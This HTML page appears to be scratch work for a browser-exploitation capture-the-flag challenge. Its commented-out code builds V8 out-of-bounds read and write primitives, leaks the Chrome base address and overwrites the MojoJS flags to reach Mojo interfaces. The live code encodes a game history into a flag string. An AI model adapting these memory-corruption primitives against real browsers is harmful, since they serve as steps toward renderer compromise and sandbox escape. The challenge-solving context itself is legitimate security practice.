<html>

<head>
    <script src="/mojo_bindings.js"></script>
    <script src="/mojos/gen/third_party/blink/public/mojom/interface.mojom.js"></script>
    <script src="/prog.js"></script>
    <script>
        const log = msg => {
            fetch("/log?log=" + encodeURIComponent(msg));
        }

        // function make_primitives() {
        //     let evil = new Uint32Array(1);
        //     let victim = new Uint32Array(1);
        //     let oob_double = [1.1, 1.1, 1.1, 1.1];
        //     let arr_addrof = [{}];
        //     evil.set([0x8888], 0);
        //     console.log("[+] oob_double.length = " + oob_double.length);
        //     return [oob_double, arr_addrof];
        // }
        // function addrof(obj) {
        //     arr_addrof[0] = obj;
        //     return (oob_double[7].f2i() >> 32n) - 1n;
        // }
        // let [oob_double, arr_addrof] = make_primitives();
        // let target = {};
        // const sleep = ms => new Promise(res => setTimeout(res, ms));
        // window.onerror = e => log({ e, text: "window error" });

        // let heap_upper = oob_double[28].f2i() & 0xffffffff00000000n;

        // /* Leak chrome base */
        // let div = document.createElement('div');
        // let addr_div = heap_upper | addrof(div);
        // console.log("[+] addr_div = " + addr_div.hex());
        // let addr_HTMLDivElement = aar64(addr_div + 0xCn);
        // console.log("[+] <HTMLDivElement> = " + addr_HTMLDivElement.hex());
        // let chrome_base = addr_HTMLDivElement - 0xc1bb7c0n;
        // console.log("[+] chrome_base = " + chrome_base.hex());

        // console.log("[+] Overwriting flags..");
        // let addr_flag_MojoJS = chrome_base + 0xc560f0en;
        // let addr_flag_MojoJSTest = chrome_base + 0xc560f0fn;
        // aaw64(addr_flag_MojoJS & 0xfffffffffffffff8n, 0x0101010101010101n);
        // aaw64(addr_flag_MojoJSTest & 0xfffffffffffffff8n, 0x0101010101010101n);


        const sleep = (ms) => new Promise((res) => setTimeout(res, ms));


        // (async () => {
        //     if (typeof Mojo === "undefined") {
        //         console.log("here no Mojo")
        //         return true;
        //     }
        //     try {
        //         // pwn here
        //         await sleep(1000)
        //         const ptr = new blink.mojom.OtterVMPtr();
        //         Mojo.bindInterface(
        //             blink.mojom.OtterVM.name,
        //             mojo.makeRequest(ptr).handle,
        //         );

        //         console.log(ptr)

        //     } catch (e) {
        //         log("error");
        //         log(": " + e.stack);
        //     }
        // })();


        function win(history) {
            const code = encode(history) + ";" + "meow";
            const score = history.length;

            if (score === 9) console.log("flag: dice{pr0_duck_gam3r_" + encode(history) + "}");


        }
        function encode(history) {
            const data = new Uint8Array(history.length * 4);

            let idx = 0;
            for (const part of history) {
                console.log("Starting again, idx: ", idx)
                console.log({ data, part })
                data[idx++] = part[0][0];
                console.log({ data })
                data[idx++] = part[0][1];
                console.log({ data })
                data[idx++] = part[1][0];
                console.log({ data })
                data[idx++] = part[1][1];
                console.log({ data })
            }
            let prev = String.fromCharCode.apply(null, data);
            let ret = btoa(prev);
            return ret;
        }




    </script>

</head>

</html>